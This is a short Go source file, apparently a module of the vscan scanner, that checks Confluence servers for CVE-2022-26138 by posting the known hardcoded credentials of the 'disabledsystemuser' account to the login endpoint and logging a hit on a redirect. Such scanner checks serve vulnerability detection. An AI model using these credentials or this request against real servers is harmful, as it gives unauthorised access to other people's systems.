package confluence

import (
	"fmt"
	"github.com/veo/vscan/pkg"
)
//author:penson 硬编码添加用户

func CVE_2022_26138(u string) bool {

	headers:=make(map[string]string,0)
	headers["Content-Type"]="application/x-www-form-urlencoded"
	if req, err := pkg.HttpRequset(u+"/dologin.action", "POST", "os_username=disabledsystemuser&os_password=disabled1system1user6708&login=%E7%99%BB%E5%BD%95&os_destination=", false, headers);err == nil {
		if req.StatusCode==302{
			pkg.GoPocLog(fmt.Sprintf("Found Confluence CVE_2022_26138|--\"%s\"\n", u))
		}

		return true
	}
	return false
}
